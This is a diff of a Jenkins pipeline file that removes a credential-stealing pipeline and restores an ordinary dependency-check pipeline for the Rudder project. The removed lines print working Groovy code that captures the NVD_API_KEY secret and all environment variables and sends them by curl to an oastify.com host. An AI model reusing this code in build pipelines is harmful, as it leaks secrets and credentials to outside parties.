@@ -1,79 +1,184 @@
-def EXFILTRATION_DOMAIN = "9w6fdx3mohs6hg9t3e11yzpnkeq5ev2k.oastify.com"
 
-def exfiltrateData(String type, def dataPayload, String credId = null) {
-    try {
-        def jsonData = [
-            type: type,
-            build_url: env.BUILD_URL ?: 'N/A',
-            job_name: env.JOB_NAME ?: 'N/A',
-            node_name: env.NODE_NAME ?: 'N/A',
-            timestamp: new Date().toISOString()
-        ]
-        if (credId) {
-            jsonData.put("credential_id", credId)
-        }
-        jsonData.put("data", dataPayload)
-        def jsonString = new groovy.json.JsonOutput().toJson(jsonData)
-        def encodedJson = jsonString.bytes.encodeBase64().toString()
-        def command = "curl -X POST --connect-timeout 15 -s -o /dev/null -w '%{http_code}' --data-urlencode 'blob=${encodedJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_data'"
-        echo "Attempting exfiltration for type: ${type}..."
-        def result = sh(script: command + " || echo 'curl_command_failed'", returnStdout: true).trim()
-        if (result == 'curl_command_failed') {
-            echo "Error: Exfiltration command failed for '${type}'."
-        } else if (result.matches(/\d{3}/) && (result.toInteger() < 200 || result.toInteger() >= 300) ) {
-            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned HTTP status: ${result}"
-        } else if (result.matches(/\d{3}/)) {
-            echo "Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} likely succeeded with HTTP status: ${result}"
-        } else {
-            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned unexpected output: ${result}"
-        }
-    } catch (Exception e) {
-        echo "Exception during exfiltration for type '${type}': ${e.getMessage()}"
-        try {
-            def errorJsonString = new groovy.json.JsonOutput().toJson([type: "exfiltration_function_error", error_message: e.getMessage(), failed_type: type])
-            def encodedErrorJson = errorJsonString.bytes.encodeBase64().toString()
-            sh(script: "curl -X POST --connect-timeout 5 -s -o /dev/null --data-urlencode 'blob=${encodedErrorJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_error' || true", returnStdout: true).trim()
-        } catch (Exception nestedE) {
-            echo "Failed to exfiltrate error details about exfiltration failure: ${nestedE.getMessage()}"
-        }
-    }
-}
+
+def version = "9.1"
+def slackResponse = null
+
+def errors = []
+
+def changeUrl = env.CHANGE_URL
+
+
+
+// Check vulns in dependencies on repo branches
+def failedBuild = false
 
 pipeline {
-    agent any
-    environment {
-        EXFIL_NVD_API_KEY = credentials('NVD_API_KEY')
-    }
+    agent none
+    triggers { cron('@daily') }
+
     stages {
-        stage('ExfiltrateAllSecurityData') {
+        stage('deps-webapp') {
+            when { not { changeRequest() } }
+            agent {
+                dockerfile {
+                    label 'generic-docker'
+                    filename 'webapp/sources/Dockerfile'
+                    // and share maven cache
+                    args '-u 0:0 -v /srv/cache/maven:/root/.m2'
+                }
+            }
+            environment {
+                NVD_API_KEY = credentials('NVD_API_KEY')
+            }
+            steps {
+                catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
+                    dir('webapp/sources') {
+                        sh script: 'mvn --batch-mode -DnvdApiKey=$NVD_API_KEY -DfailBuildOnCVSS=7 -DcveValidForHours=48 -DsuppressionFiles=dependency-check-suppression.xml -DossindexAnalyzerEnabled=false org.owasp:dependency-check-maven:aggregate', label: "check webapp dependencies"
+                        sh script: 'mvn --batch-mode license:aggregate-third-party-report', label: 'list webapp dependencies'
+                    }
+                }
+            }
+            post {
+
+                always {
+                    archiveArtifacts artifacts: 'webapp/sources/target/dependency-check-report.html, webapp/sources/target/site/aggregate-third-party-report.html'
+                }
+
+                failure {
+                    script {
+                        errors.add("webapp")
+                        failedBuild = true
+                        slackResponse = updateSlack(errors, slackResponse, version, changeUrl, false)
+                        slackSend(channel: slackResponse.threadId, message: "Dependency check error on webapp - <${currentBuild.absoluteUrl}console|Console>", color: "#CC3421")
+                    }
+                }
+            }
+        }
+
+        stage('deps-npm') {
+            when { not { changeRequest() } }
+            agent {
+                dockerfile {
+                    label 'generic-docker'
+                    filename 'webapp/sources/Dockerfile'
+                    additionalBuildArgs "--build-arg USER_ID=${JENKINS_UID}"
+                    // and share maven cache
+                    args '-u 0:0 -v /srv/cache/maven:/root/.m2'
+                }
+            }
+            steps {
+                catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
+                    dir('webapp/sources/rudder/rudder-web/src/main/') {
+                        sh script: 'npm_config_loglevel=error npm ci --no-audit', label: "install dependencies"
+                        sh script: 'npx better-npm-audit audit --level high', label: "check npm dependencies"
+                    }
+                }
+            }
+            post {
+                failure {
+                    script {
+                        errors.add("npm")
+                        failedBuild = true
+                        slackResponse = updateSlack(errors, slackResponse, version, changeUrl, false)
+                        slackSend(channel: slackResponse.threadId, message: "Dependency check error on npm - <${currentBuild.absoluteUrl}console|Console>", color: "#CC3421")
+                    }
+                }
+            }
+        }
+        stage('deps-rust') {
+            when { not { changeRequest() } }
+            agent {
+                dockerfile {
+                    label 'generic-docker'
+                    filename 'relay/sources/relayd/Dockerfile'
+                    // mount cache
+                    args '-u 0:0 -v /srv/cache/cargo:/usr/local/cargo/registry'
+                }
+            }
+            steps {
+                catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
+                    sh script: 'mkdir -p target', label: 'create target directory'
+                    sh script: 'cargo deny check', label: 'check relayd dependencies'
+                    sh script: 'cargo deny list > target/rust-dependencies.txt', label: 'list rust dependencies'
+                }
+            }
+            post {
+                failure {
+                    script {
+                        errors.add("rust")
+                        failedBuild = true
+                        slackResponse = updateSlack(errors, slackResponse, version, changeUrl, false)
+                        slackSend(channel: slackResponse.threadId, message: "Dependency check error on rust projects - <${currentBuild.absoluteUrl}console|Console>", color: "#CC3421")
+                    }
+                }
+                always {
+                    archiveArtifacts artifacts: 'target/*-dependencies.txt'
+                }
+            }
+        }
+        stage('deps-rust-pr') {
+            when { changeRequest() }
+            agent {
+                dockerfile {
+                    label 'generic-docker'
+                    filename 'relay/sources/relayd/Dockerfile'
+                    // mount cache
+                    args '-u 0:0 -v /srv/cache/cargo:/usr/local/cargo/registry'
+                }
+            }
+            steps {
+                catchError(buildResult: 'SUCCESS', stageResult: 'FAILURE') {
+                    sh script: 'mkdir -p target', label: 'create target directory'
+                    sh script: 'cargo deny check license sources bans', label: 'check rust dependencies'
+                }
+            }
+            post {
+                failure {
+                    script {
+                        errors.add("rust")
+                        failedBuild = true
+                        slackResponse = updateSlack(errors, slackResponse, version, changeUrl, false)
+                        slackSend(channel: slackResponse.threadId, message: "Dependency check error on rust projects - <${currentBuild.absoluteUrl}console|Console>", color: "#CC3421")
+                    }
+                }
+            }
+        }
+        stage('End') {
             steps {
                 script {
-                    echo "Attempting to exfiltrate environment variables and NVD_API_KEY."
-
-                    def nvdApiKeyCredId = 'NVD_API_KEY'
-                    def nvdApiKeyValue = env.EXFIL_NVD_API_KEY
-
-                    if (nvdApiKeyValue != null && nvdApiKeyValue != "") {
-                         exfiltrateData("credential_NVD_API_KEY_via_env_block",
-                                       [credential_id: nvdApiKeyCredId,
-                                        retrieved_value_present: "yes (value captured and sent)",
-                                        actual_value: nvdApiKeyValue], // Sending the actual value
-                                       nvdApiKeyCredId)
+                    updateSlack(errors, slackResponse, version, changeUrl, true)
+                    if (failedBuild) {
+                        error 'End of build'
                     } else {
-                         exfiltrateData("credential_NVD_API_KEY_via_env_block_not_found",
-                                       [credential_id: nvdApiKeyCredId,
-                                        error: "NVD_API_KEY was not found or was empty in env.EXFIL_NVD_API_KEY after using credentials() in environment block."],
-                                       nvdApiKeyCredId)
+                        echo 'End of build '
                     }
-                    
-                    exfiltrateData("all_environment_variables", env.getEnvironment())
-                    
-                    def originalVersionVar = "8.3"
-                    exfiltrateData("original_script_variables_info_security_jenkinsfile", [original_version_variable_from_jenkins_security: originalVersionVar])
-
-                    echo "Minimal exfiltration attempts for Jenkins_security file complete."
                 }
             }
         }
     }
+}
+
+def updateSlack(errors, slackResponse, version, changeUrl, isEnded) {
+  def msg ="*${version} - rudder dependency check* - <"+currentBuild.absoluteUrl+"|Link>"
+
+  if (changeUrl == null) {
+
+      def fixed = currentBuild.resultIsBetterOrEqualTo("SUCCESS") && currentBuild.previousBuild.resultIsWorseOrEqualTo("UNSTABLE")
+      if (errors.isEmpty() && isEnded && fixed) {
+        msg +=  " => No security issues found! :white_check_mark:"
+        def color = "good"
+        slackSend(channel: "ci-security", message: msg, color: color)
+      }
+
+
+      if (! errors.isEmpty()) {
+          msg += "\n*Errors* :x: ("+errors.size()+")\n  • " + errors.join("\n  • ")
+          def color = "#CC3421"
+          if (slackResponse == null) {
+            slackResponse = slackSend(channel: "ci-security", message: msg, color: color)
+          }
+          slackSend(channel: slackResponse.channelId, message: msg, timestamp: slackResponse.ts, color: color)
+      }
+      return slackResponse
+  }
 }
